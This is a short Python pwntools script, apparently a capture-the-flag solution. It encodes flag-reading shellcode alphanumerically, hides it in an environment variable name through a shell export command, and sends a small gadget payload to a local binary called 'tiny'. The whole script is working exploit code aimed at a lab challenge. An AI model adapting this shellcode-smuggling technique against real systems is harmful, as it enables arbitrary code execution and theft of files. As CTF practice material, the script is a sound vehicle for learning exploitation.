#!/usr/bin/env python3
# /// script
# requires-python = ">=3.12"
# dependencies = [
#     "ae64",
#     "pwntools>=4.15.0",
# ]
#
# [tool.uv.sources]
# ae64 = { git = "https://github.com/veritas501/ae64.git" }
#
# ///

from pwn import *
from ae64 import AE64

HOST = 'localhost'
PORT = 50000

context(arch='amd64', os='linux')

shellcode_part2 = AE64().encode(asm(shellcraft.cat(b'./flag')))

shellcode_part1 = asm('''
jmp short get_rip
got_rip:
pop rax
jmp rax
get_rip:
call got_rip
''')
print(shellcode_part1.hex())

shellcode = shellcode_part1 + shellcode_part2
shellcode_enc = ''.join(f'\\x{x:02x}' for x in shellcode)

payload2 = asm('ret; pop rax; ret')
payload2_enc = ''.join(f'\\x{x:02x}' for x in payload2)

payload = '''
export $'%s'=A
echo -e "%s" | ./tiny''' % (shellcode_enc, payload2_enc)

print(payload)

if True:
    io = remote(HOST, PORT, level='warn')
    io.sendline(payload)

else:
    io = gdb.debug(['../tiny'], env={shellcode: b'A'})
    io.sendline(payload2)

io.interactive()
#print(io.recv())
#io.close()
